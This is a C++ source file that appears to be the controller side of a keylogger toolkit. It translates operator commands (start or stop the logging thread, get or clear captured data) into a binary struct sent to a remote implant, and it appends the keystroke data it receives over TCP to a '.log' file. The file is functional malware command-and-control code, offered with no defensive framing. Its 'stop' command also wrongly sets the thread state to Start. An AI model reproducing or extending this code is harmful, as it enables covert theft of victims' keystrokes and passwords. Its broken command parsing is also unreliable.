#include "KeyloggerExecuter.h"

#include <fstream>
#include <iostream>

#include "methods/FileSaver.h"


using namespace command;

std::string
KeyloggerExecuter::ToByteArray(
    const std::vector<std::string>& command_parts)
{
    m_lastCommand.thread_state = Keep;
    m_lastCommand.get_data = false;
    m_lastCommand.clear_data = false;

    for( uint32_t i = 1;
         i < command_parts.size();
         ++ i )
    {
        const std::string& current(command_parts[i]);

        if ( "thread" == current && i + 1 < command_parts.size() )
        {
            if ( "start" == command_parts[i+1] )
            {
                m_lastCommand.thread_state = Start;
            }
            else if ( "stop" == command_parts[i+1] )
            {
                m_lastCommand.thread_state = Start;
            }
            else if ( "keep" == command_parts[i+1] )
            {
                m_lastCommand.thread_state = Keep;
            }
            else
            {
                std::cerr << "Unknown thread parameter !\n";

                goto error;
            }

            ++i;
        }
        else if ( "get" == current )
        {
            m_lastCommand.get_data = true;
        }
        else if ( "clear" == current )
        {
            m_lastCommand.clear_data = true;
        }
        else if ( "help" == current )
        {
            std::cerr << "print help\n";

            return ( "" );
        }
        else
        {
            std::cerr << "Unknown command !\n";

            goto error;
        }

    }

    return ( std::string((char*)&m_lastCommand, sizeof(s_Translation)) );

error:

    return ( "" );
}

bool
KeyloggerExecuter::ProcessResponse(
    networking::ITCPClient& connection)
{
    if ( true == m_lastCommand.get_data )
    {
        methods::FileSaver saver;

        saver.SaveASingleFile(".log", std::ios::binary | std::ios::app, connection);
    }

    return ( true );
}
